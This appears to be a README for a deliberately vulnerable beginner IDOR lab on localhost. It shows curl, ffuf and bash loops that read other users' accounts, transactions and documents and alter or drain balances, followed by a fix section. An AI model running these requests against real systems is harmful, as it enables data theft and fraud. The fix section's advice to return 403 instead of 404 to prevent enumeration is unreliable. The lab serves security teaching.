# Lab 03 — IDOR (Insecure Direct Object Reference) 🔴

**Port:** `8003`  
**Stack:** Node.js + PostgreSQL  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

### 1. No Ownership Validation
The API accepts a resource ID and returns it without checking that the requesting user **owns** that resource. The `X-User-Id` header is used for "authentication" but never compared against the resource owner.

### 2. Sequential Integer IDs
Resources use auto-increment integers (1, 2, 3…), making enumeration trivial — no guessing needed.

### 3. Sensitive Data in Documents Endpoint
The `/documents/:id` endpoint returns full document content including tax records, contracts, and financial reports.

### 4. Write-Access IDOR
The `PUT /accounts/:id/balance` endpoint allows any user to modify any account balance.

---

## 🎯 Attack Scenarios

### Scenario A — Account Enumeration (Horizontal Privilege Escalation)
**Goal:** As user 2 (Bob), read Alice's and Admin's account details.

```bash
docker compose up -d

# Authenticate as Bob (user ID 2)
# Access your own account — works fine
curl http://localhost:8003/accounts/2 -H "X-User-Id: 2"

# IDOR: Access Alice's account as Bob
curl http://localhost:8003/accounts/1 -H "X-User-Id: 2"

# IDOR: Access Admin's account
curl http://localhost:8003/accounts/3 -H "X-User-Id: 2"

# Enumerate all accounts with ffuf
ffuf -u http://localhost:8003/accounts/FUZZ \
  -H "X-User-Id: 2" \
  -w <(seq 1 100 | tr '\n' '\n') \
  -mc 200
```

### Scenario B — Transaction History Leakage
```bash
# Read admin's confidential transaction history as Bob
curl http://localhost:8003/accounts/3/transactions -H "X-User-Id: 2"

# Script to dump all transaction histories
for i in $(seq 1 10); do
  echo "=== Account $i ==="
  curl -s http://localhost:8003/accounts/$i/transactions -H "X-User-Id: 2"
done
```

### Scenario C — Document Exfiltration
```bash
# Enumerate and download all documents
for i in $(seq 1 20); do
  result=$(curl -s http://localhost:8003/documents/$i -H "X-User-Id: 2")
  if echo "$result" | grep -q '"id"'; then
    echo "=== Document $i ===" && echo $result
  fi
done
```

### Scenario D — Financial Fraud via Write IDOR
```bash
# As Bob (user 2), inflate your own balance by accessing your own account
curl -X PUT http://localhost:8003/accounts/2/balance \
  -H "X-User-Id: 2" \
  -H "Content-Type: application/json" \
  -d '{"amount": 1000000}'

# Or drain Alice's account
curl -X PUT http://localhost:8003/accounts/1/balance \
  -H "X-User-Id: 2" \
  -H "Content-Type: application/json" \
  -d '{"amount": -50000}'
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `ffuf` | `ffuf -u http://localhost:8003/accounts/FUZZ -H "X-User-Id: 2" -w ids.txt -mc 200` |
| `Burp Suite Intruder` | Set position on ID, payload: numbers 1–1000 |
| `curl` + bash loop | Manual enumeration |
| `nuclei` | IDOR detection templates |

---

## 🔐 How to Fix

```javascript
// SECURE: Always verify ownership
app.get('/accounts/:id', auth, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM accounts WHERE id = $1 AND owner_id = $2',
    [req.params.id, req.userId]  // Must match authenticated user
  );
  if (result.rows.length === 0) 
    return res.status(403).json({ error: 'Forbidden' }); // Not 404!
  res.json(result.rows[0]);
});
```

**Key fixes:**
- Always JOIN ownership in DB queries
- Use UUIDs instead of sequential integers
- Return 403 (not 404) on unauthorized access to prevent enumeration
- Implement proper JWT-based authentication (not header trust)
- Log and alert on repeated cross-user access attempts
